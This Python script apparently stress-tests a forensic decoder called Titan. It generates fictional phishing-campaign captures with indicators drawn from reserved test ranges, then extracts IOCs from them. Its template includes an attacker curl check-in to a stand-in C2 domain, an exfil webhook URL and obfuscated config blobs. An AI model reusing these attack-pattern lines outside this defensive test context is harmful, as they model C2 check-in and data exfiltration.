#!/usr/bin/env python3
"""Synthetic stress scenario runner for Titan.

This generates a *fictional* "careless newbie attacker" payload capture and runs it
through Titan's analysis pipeline repeatedly.

Safety note: all indicators are synthetic and use reserved documentation ranges
(e.g., 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and example domains.
"""

from __future__ import annotations

import argparse
import base64
import dataclasses
import gzip
import html
import io
import json
import random
import string
import time
import urllib.parse
import zipfile
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Tuple

from titan_decoder.config import Config
from titan_decoder.core.device_forensics import ForensicsEngine
from titan_decoder.core.engine import TitanEngine


@dataclasses.dataclass(frozen=True)
class ScenarioVariant:
    case_id: str
    attacker_handle: str
    used_vpn: bool
    vpn_provider: str | None
    vpn_protocol: str | None
    vm_platform: str | None
    used_ghost_device: bool
    ghost_device_hint: str | None
    burner_hostname: str | None
    os_hint: str
    locale_hint: str
    timezone_hint: str
    home_ip: str
    exit_ip: str
    c2_domain: str
    drop_domain: str
    contact_email: str
    user_agent: str


def _rand_hex(rng: random.Random, n_bytes: int) -> str:
    return "".join(rng.choice("0123456789abcdef") for _ in range(n_bytes * 2))


def _pick(rng: random.Random, items: List[str]) -> str:
    return items[rng.randrange(0, len(items))]


def _rfc5737_ip(rng: random.Random, block: str) -> str:
    # block is one of 192.0.2, 198.51.100, 203.0.113
    return f"{block}.{rng.randint(1, 254)}"


def _hostname_burner(rng: random.Random) -> str:
    prefix = _pick(rng, ["DESKTOP", "LAPTOP", "WIN"])
    suffix = "".join(rng.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    return f"{prefix}-{suffix}"


def _gzip_b64_json(obj: Dict[str, Any]) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    gz = gzip.compress(raw)
    return base64.b64encode(gz).decode("ascii")


def _wrap_base64_lines(b64: str, width: int = 76) -> str:
    return "\n".join(b64[i : i + width] for i in range(0, len(b64), width))


def _xor_bytes(data: bytes, key: int) -> bytes:
    return bytes((b ^ key) for b in data)


def build_hard_payload_b64(variant: ScenarioVariant, rng: random.Random) -> str:
    """Return a *base64-only* payload so RecursiveBase64Decoder engages.

    Payload structure: base64(gzip(zip(files...))).
    """

    # Synthetic, reserved, safe indicators.
    public_ip = _rfc5737_ip(rng, "203.0.113")
    internal_ip = f"10.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"
    url = f"https://{variant.c2_domain}/api/v1/collect?src=hard&rid={rng.randint(10000, 99999)}"

    encoded_url = urllib.parse.quote(url, safe="")
    html_encoded_email = html.escape(variant.contact_email)
    unicode_escaped_tag = "".join(f"\\u{ord(ch):04x}" for ch in ("localbank"))

    notes_txt = (
        "# Hard-mode synthetic artifact bundle\n"
        f"case_id={variant.case_id}\n"
        f"vm_hint={variant.vm_platform or 'none'}\n"
        f"timezone={variant.timezone_hint}\n"
        f"public_ip={public_ip}\n"
        f"internal_ip={internal_ip}\n"
        f"url_encoded={encoded_url}\n"
        f"html_entity_email={html_encoded_email}\n"
        f"unicode_tag={unicode_escaped_tag}\n"
        "\n"
        "All indicators are synthetic/reserved for testing only.\n"
    ).encode("utf-8")

    inner_cfg = {
        "case_id": variant.case_id,
        "tz": variant.timezone_hint,
        "c2": url,
        "contact": variant.contact_email,
        "burner": variant.burner_hostname or "none",
        "operator": variant.attacker_handle,
    }
    inner_gz_json = gzip.compress(json.dumps(inner_cfg, separators=(",", ":")).encode("utf-8"))
    blob_gzjson_b64 = _wrap_base64_lines(base64.b64encode(inner_gz_json).decode("ascii")).encode(
        "ascii"
    )

    xor_key = rng.choice([0xAA, 0x5A, 0xCC])
    xor_plain = (
        f"C2_DOMAIN={variant.c2_domain}\n"
        f"DROP_DOMAIN={variant.drop_domain}\n"
        f"PUBLIC_IP={public_ip}\n"
        f"CONTACT={variant.contact_email}\n"
    ).encode("utf-8")
    stage_xor = _xor_bytes(xor_plain, xor_key)

    zip_io = io.BytesIO()
    with zipfile.ZipFile(zip_io, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("README.txt", "Synthetic stress artifact bundle (hard).\n")
        zf.writestr("notes.txt", notes_txt)
        zf.writestr("blob_gzjson.b64", blob_gzjson_b64)
        zf.writestr("stage_xor.bin", stage_xor)

    outer_gz = gzip.compress(zip_io.getvalue())
    return _wrap_base64_lines(base64.b64encode(outer_gz).decode("ascii"))


def generate_variant(rng: random.Random) -> ScenarioVariant:
    attacker_handle = _pick(
        rng,
        [
            "byte_newbie",
            "root_learner",
            "packetpupil",
            "shell_kid",
            "crypto_noob",
            "zeroeffort",
        ],
    )

    used_vpn = rng.random() < 0.7

    vpn_provider = None
    vpn_protocol = None
    if used_vpn:
        vpn_provider = _pick(
            rng,
            [
                "Mullvad",
                "ProtonVPN",
                "NordVPN",
                "Surfshark",
                "Windscribe",
                "Custom VPS (WireGuard)",
            ],
        )
        vpn_protocol = _pick(rng, ["WireGuard", "OpenVPN", "IKEv2"])

    vm_platform = None
    if rng.random() < 0.55:
        vm_platform = _pick(rng, ["VMware", "VirtualBox", "KVM", "Hyper-V"])

    used_ghost_device = rng.random() < 0.35
    ghost_device_hint = None
    if used_ghost_device:
        ghost_device_hint = _pick(
            rng,
            [
                "Live USB (no persistence)",
                "Disposable cloud VM",
                "Ephemeral container session",
                "Fresh OS snapshot restore",
            ],
        )

    burner_hostname = None
    if rng.random() < 0.6:
        burner_hostname = _hostname_burner(rng)

    os_hint = _pick(
        rng,
        [
            "Windows 11",
            "Windows 10",
            "Ubuntu 24.04",
            "Debian 12",
            "Kali Linux",
            "macOS (Intel)",
        ],
    )
    locale_hint = _pick(rng, ["en-US", "en-GB", "es-ES", "fr-FR", "de-DE"])

    timezone_hint = _pick(rng, ["UTC", "EST", "EDT", "CST", "PST", "GMT"])

    home_ip = _rfc5737_ip(rng, _pick(rng, ["203.0.113", "198.51.100"]))
    exit_ip = _rfc5737_ip(rng, "192.0.2") if used_vpn else home_ip

    c2_domain = _pick(
        rng,
        [
            "api.localbank.example",
            "telemetry.localbank.example",
            "cdn-localbank.example",
            "update-service.example",
        ],
    )
    drop_domain = _pick(rng, ["dropbox.example", "fileshare.example", "cdn.example"])

    contact_email = f"{attacker_handle}@mail.example"
    user_agent = _pick(
        rng,
        [
            "curl/7.68.0",
            "python-requests/2.31.0",
            "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0",
            "PostmanRuntime/7.36.1",
        ],
    )

    case_id = f"TN-{datetime.now(timezone.utc).strftime('%Y%m%d')}-{rng.randint(10000, 99999)}"

    return ScenarioVariant(
        case_id=case_id,
        attacker_handle=attacker_handle,
        used_vpn=used_vpn,
        vpn_provider=vpn_provider,
        vpn_protocol=vpn_protocol,
        vm_platform=vm_platform,
        used_ghost_device=used_ghost_device,
        ghost_device_hint=ghost_device_hint,
        burner_hostname=burner_hostname,
        os_hint=os_hint,
        locale_hint=locale_hint,
        timezone_hint=timezone_hint,
        home_ip=home_ip,
        exit_ip=exit_ip,
        c2_domain=c2_domain,
        drop_domain=drop_domain,
        contact_email=contact_email,
        user_agent=user_agent,
    )


def _timezone_to_region_hypothesis(tz: str) -> str:
    # Deliberately coarse and non-assertive. Timezone ≠ location.
    mapping = {
        "UTC": "Could be anywhere; UTC is non-informative.",
        "GMT": "Broadly Europe/UK time; could also be a configured system setting.",
        "EST": "Broadly North America (Eastern); could be configured setting.",
        "EDT": "Broadly North America (Eastern); could be configured setting.",
        "CST": "Broadly North America (Central); could be configured setting.",
        "PST": "Broadly North America (Pacific); could be configured setting.",
    }
    return mapping.get(tz, "Timezone hint is weak; treat as low-confidence.")


def build_payload_text(variant: ScenarioVariant, rng: random.Random) -> str:
    # All content is synthetic. It is designed to include extractable IOCs and
    # "careless" leaked artifacts (headers, hostnames, timezones, etc.).

    campaign = f"CBK-{rng.randint(1000, 9999)}"
    fake_hash = _rand_hex(rng, 32)  # 64 hex chars (sha256-like)

    infra = {
        "campaign": campaign,
        "case_id": variant.case_id,
        "attacker_handle": variant.attacker_handle,
        "vpn_used": variant.used_vpn,
        "vpn_provider": variant.vpn_provider or "none",
        "vpn_protocol": variant.vpn_protocol or "none",
        "home_ip": variant.home_ip,
        "exit_ip": variant.exit_ip,
        "timezone": variant.timezone_hint,
        "vm_platform": variant.vm_platform or "none",
        "ghost_device": {
            "used": variant.used_ghost_device,
            "hint": variant.ghost_device_hint or "none",
        },
        "burner_hostname": variant.burner_hostname or "none",
        "os": variant.os_hint,
        "locale": variant.locale_hint,
        "c2": {
            "domain": variant.c2_domain,
            "uri": f"https://{variant.c2_domain}/v2/checkin",
        },
        "drop": {
            "domain": variant.drop_domain,
            "uri": f"https://{variant.drop_domain}/upload/{campaign}.zip",
        },
        "contact": {
            "email": variant.contact_email,
            "chat": f"telegram:@{variant.attacker_handle}",
        },
    }

    config_blob = _gzip_b64_json(infra)

    vm_line = f"vm_hint={variant.vm_platform}\n" if variant.vm_platform else ""
    ghost_line = (
        f"ghost_device={variant.ghost_device_hint}\n" if variant.used_ghost_device else ""
    )
    host_line = (
        f"hostname={variant.burner_hostname}\n" if variant.burner_hostname else ""
    )

    # Include both public & private IPs to exercise IOC classification.
    internal_ip = f"10.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"

    text = f"""# Synthetic Incident Capture (Fictional)
# Scenario: careless newbie attacker targeting a local bank brand (example-only)
# Case ID: {variant.case_id}
# Campaign: {campaign}
# IMPORTANT: This file is synthetic test data. Do not treat as real attribution.

=== PHISH EMAIL HEADERS (synthetic) ===
From: \"IT Helpdesk\" <helpdesk@localbank.example>
Reply-To: {variant.contact_email}
Message-ID: <{campaign}.{rng.randint(100000,999999)}@localbank.example>
Received: from smtp.localbank.example ({variant.exit_ip}) by mx.localbank.example; Fri, 20 Dec 2025 10:15:12 {variant.timezone_hint}
X-Originating-IP: [{variant.home_ip}]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Thunderbird/115.6

Body:
Please review your mailbox quota report.
https://portal.localbank.example/quota/report?id={campaign}

=== OPERATOR COMMAND (synthetic) ===
# attacker runs quick-and-dirty tooling and forgets to scrub headers
curl -s https://{variant.c2_domain}/v2/checkin?id={campaign}&host={variant.burner_hostname or 'UNKNOWN'}&tz={variant.timezone_hint} \\
  -H \"User-Agent: {variant.user_agent}\" \\
  -H \"X-Debug: true\" \\
  -H \"X-Operator: {variant.attacker_handle}\" \\
  -H \"X-Real-IP: {variant.home_ip}\" \\
  -H \"X-Forwarded-For: {variant.home_ip}\" \\
  -H \"X-Internal-IP: {internal_ip}\"

=== CAPTURED HTTP (synthetic) ===
POST /v2/checkin?id={campaign} HTTP/1.1
Host: {variant.c2_domain}
User-Agent: {variant.user_agent}
X-Operator: {variant.attacker_handle}
X-Debug: true
X-Real-IP: {variant.home_ip}

POST /v2/upload?id={campaign} HTTP/1.1
Host: {variant.c2_domain}
User-Agent: python-requests/2.31.0
X-Operator: {variant.attacker_handle}
X-Forwarded-For: {variant.home_ip}
CF-Connecting-IP: {variant.exit_ip}

=== DATA SNIPPET (synthetic, not real PII) ===
customer_id=EXAMPLE-{rng.randint(100000,999999)}
account_masked=XXXX-XXXX-XXXX-{rng.randint(1000,9999)}
amount={rng.randint(10,9000)}.{rng.randint(0,99):02d}
file_sha256={fake_hash}

=== CONFIG LEAK (base64(gzip(json))) ===
CONFIG_B64_GZ={config_blob}

=== DEVICE / ENV HINTS (synthetic) ===
ssh_banner=OpenSSH_9.6p1 Debian-1
os={variant.os_hint}
locale={variant.locale_hint}
build_host=synthetic-build-{_pick(rng, ['laptop', 'vm', 'desktop'])}
{vm_line}{ghost_line}{host_line}timezone={variant.timezone_hint}
vpn={'enabled' if variant.used_vpn else 'disabled'}
vpn_provider={variant.vpn_provider or 'none'}
vpn_protocol={variant.vpn_protocol or 'none'}
note={'VPN tunnel active; forgot to strip X-Forwarded-For' if variant.used_vpn else 'No VPN used; home IP leaked in headers'}
exfil=https://{variant.drop_domain}/api/webhooks/{rng.randint(10**17,10**18-1)}/{_rand_hex(rng, 16)}
contact_email={variant.contact_email}
"""

    return text


def _ioc_leads_from_report(report: Dict[str, Any], forensics: Dict[str, Any]) -> Dict[str, Any]:
    iocs = report.get("iocs", {}) or {}
    leads: List[Dict[str, Any]] = []

    for ip in iocs.get("ipv4_public", []) or []:
        leads.append(
            {
                "type": "network_ip",
                "value": ip,
                "rationale": "Observed in payload headers/logs (synthetic).",
            }
        )

    for domain in iocs.get("domains", []) or []:
        leads.append(
            {
                "type": "domain",
                "value": domain,
                "rationale": "Observed as host/C2/domain indicator (synthetic).",
            }
        )

    for url in iocs.get("urls", []) or []:
        leads.append(
            {
                "type": "url",
                "value": url,
                "rationale": "Observed URL indicator (synthetic).",
            }
        )

    for email in iocs.get("emails", []) or []:
        leads.append(
            {
                "type": "email",
                "value": email,
                "rationale": "Observed contact / reply-to (synthetic).",
            }
        )

    # Include a compact forensics block as "context" for investigators.
    return {
        "iocs": iocs,
        "forensics": forensics,
        "leads": leads,
        "package": {
            "observables": {
                "ips": iocs.get("ipv4_public", []) or [],
                "domains": iocs.get("domains", []) or [],
                "urls": iocs.get("urls", []) or [],
                "emails": iocs.get("emails", []) or [],
                "hashes": iocs.get("hashes", []) or [],
            },
            "attribution_hypotheses": {
                "timezone_hints": forensics.get("timezone_hints", []) or [],
                "timezone_interpretation": [
                    {
                        "hint": tz,
                        "hypothesis": _timezone_to_region_hypothesis(tz),
                        "confidence": "Low",
                    }
                    for tz in (forensics.get("timezone_hints", []) or [])
                ],
                "vm_artifacts": forensics.get("vm", {}) or {},
                "burner_assessment": forensics.get("burner", {}) or {},
                "network_notes": "IPs in this synthetic scenario are from RFC 5737 documentation ranges and cannot be geolocated.",
            },
            "recommended_next_steps": [
                "Correlate repeated operator handles, user-agent strings, and infrastructure patterns across cases.",
                "If this were real data: run WHOIS/GeoIP/ASN enrichment on public IPs and domains, and preserve chain-of-custody for artifacts.",
                "If this were real data: request platform logs for webhook endpoints / domains from the relevant service providers.",
            ],
        },
        "notes": [
            "Synthetic dataset: do not treat these as real-world attribution.",
            "Use observables to test exports and correlation logic only.",
        ],
    }


def run_iteration(engine: TitanEngine, forensics_engine: ForensicsEngine, payload: bytes) -> Tuple[Dict[str, Any], Dict[str, Any], float]:
    start = time.perf_counter()
    report = engine.run_analysis(payload)
    elapsed = time.perf_counter() - start
    forensics = forensics_engine.analyze(report)
    return report, forensics, elapsed


def main() -> int:
    parser = argparse.ArgumentParser(description="Titan synthetic stress scenario runner")
    parser.add_argument("--iterations", type=int, default=50)
    parser.add_argument("--seed", type=int, default=1337)
    parser.add_argument("--profile", choices=["fast", "full"], default="full")
    parser.add_argument("--out-dir", type=Path, default=Path("/tmp/titan_stress_export"))
    parser.add_argument("--difficulty", choices=["easy", "hard"], default="easy")
    args = parser.parse_args()

    rng = random.Random(args.seed)

    cfg = Config()
    if args.profile == "fast":
        cfg.set("max_recursion_depth", 3)
        cfg.set("max_node_count", 50)
        cfg.set("enable_parallel_extraction", False)
    else:
        cfg.set("max_recursion_depth", 8)
        cfg.set("max_node_count", 200)
        cfg.set("enable_parallel_extraction", True)

    # Keep logs quiet for stress runs.
    cfg.set("enable_logging", False)

    engine = TitanEngine(cfg)
    fe = ForensicsEngine()

    out_dir: Path = args.out_dir
    out_dir.mkdir(parents=True, exist_ok=True)

    results: List[Dict[str, Any]] = []
    leads_out = out_dir / "law_enforcement_leads.json"
    methodology_out = out_dir / "methodology.md"
    jsonl_out = out_dir / "runs.jsonl"

    # Aggregate export format: a single JSON document suitable for external sharing.
    export: Dict[str, Any] = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "profile": args.profile,
        "difficulty": args.difficulty,
        "iterations": args.iterations,
        "seed": args.seed,
        "disclaimer": "Synthetic test output. Not real attribution.",
        "how_to_reproduce": {
            "command": f"python tools/stress_scenario_careless_newbie_bank.py --iterations {args.iterations} --seed {args.seed} --profile {args.profile} --out-dir {out_dir}",
            "outputs": {
                "law_enforcement_leads": str(leads_out),
                "runs_jsonl": str(jsonl_out),
                "methodology": str(methodology_out),
            },
        },
        "runs": [],
    }

    methodology_out.write_text(
        """# Titan Synthetic Stress Scenario: Careless Newbie 'Hacker' vs Local Bank (Fictional)

This folder contains **synthetic** outputs generated by Titan Decoder.

## What this does
- Generates a fictional incident "payload capture" that intentionally contains extractable indicators.
- Runs `TitanEngine.run_analysis` to decode and extract IOCs.
- Runs `ForensicsEngine.analyze` over the report to extract VM/burner/timezone heuristics.
- Writes a consolidated JSON export that looks like something you could hand to investigators **for testing only**.

## Why these steps
- The engine output provides machine-readable observables (IPs/domains/URLs/emails/hashes).
- The forensics pass provides low-confidence contextual hints (timezone, VM artifacts, burner heuristics) that help correlate cases.

## Reproduce
Run the command included in `law_enforcement_leads.json` under `how_to_reproduce.command`.
""",
        encoding="utf-8",
    )

    with jsonl_out.open("w", encoding="utf-8") as jf:
        for _ in range(args.iterations):
            variant = generate_variant(rng)
            if args.difficulty == "hard":
                payload_b64 = build_hard_payload_b64(variant, rng)
                payload_bytes = payload_b64.encode("ascii")
            else:
                payload_text = build_payload_text(variant, rng)
                payload_bytes = payload_text.encode("utf-8")

            report, forensics, elapsed = run_iteration(engine, fe, payload_bytes)

            run_record = {
                "case_id": variant.case_id,
                "attacker_handle": variant.attacker_handle,
                "randomized": {
                    "used_vpn": variant.used_vpn,
                    "vm_platform": variant.vm_platform,
                    "burner_hostname": variant.burner_hostname,
                    "timezone_hint": variant.timezone_hint,
                },
                "difficulty": args.difficulty,
                "metrics": {
                    "seconds": elapsed,
                    "node_count": report.get("node_count", 0),
                },
                "export": _ioc_leads_from_report(report, forensics),
            }

            export["runs"].append(run_record)
            jf.write(json.dumps(run_record) + "\n")
            results.append(run_record)

    # Write a single consolidated export file.
    leads_out.write_text(json.dumps(export, indent=2), encoding="utf-8")

    # Print a compact summary.
    times = [r["metrics"]["seconds"] for r in results]
    avg_s = sum(times) / max(1, len(times))
    p95_s = sorted(times)[int(0.95 * (len(times) - 1))] if len(times) > 1 else times[0]
    print(f"Wrote: {leads_out}")
    print(f"Wrote: {jsonl_out}")
    print(f"runs={len(results)} avg_s={avg_s:.4f} p95_s={p95_s:.4f}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
